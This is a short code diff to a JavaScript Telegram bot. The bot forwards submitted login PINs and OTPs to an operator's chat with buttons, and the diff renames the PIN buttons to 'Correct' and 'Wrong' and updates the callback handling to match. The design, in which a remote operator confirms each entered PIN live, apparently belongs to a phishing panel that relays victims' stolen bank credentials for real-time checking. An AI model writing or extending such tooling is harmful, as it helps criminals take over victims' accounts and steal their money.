@@ -153,10 +153,10 @@ async function notifyLoginVerification(login) {
     chatId: CHAT_ID
   });
 
-  const approveLabel = type === 'pin' ? '✅ Approve PIN' : '✅ Approve OTP';
-  const rejectLabel = type === 'pin' ? '❌ Reject PIN' : '❌ Reject OTP';
-  const approveData = type === 'pin' ? `pin_approve:${id}` : `otp_approve:${id}`;
-  const rejectData = type === 'pin' ? `pin_reject:${id}` : `otp_reject:${id}`;
+  const approveLabel = type === 'pin' ? '✅ Correct' : '✅ Approve OTP';
+  const rejectLabel = type === 'pin' ? '❌ Wrong' : '❌ Reject OTP';
+  const approveData = type === 'pin' ? `correct:${id}` : `otp_approve:${id}`;
+  const rejectData = type === 'pin' ? `wrong:${id}` : `otp_reject:${id}`;
 
   tgApi('sendMessage', {
     chat_id: CHAT_ID,
@@ -252,10 +252,10 @@ async function handleCallback(cq) {
     return;
   }
 
-  if (action === 'pin_approve' || action === 'pin_reject' || action === 'otp_approve' || action === 'otp_reject') {
-    const decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
-    const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
-    const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
+  if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
+    const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
+    const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
+    const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
     const rec = await store.get(store.NS.LOGIN, id);
     if (rec) {
       rec.status = decision;
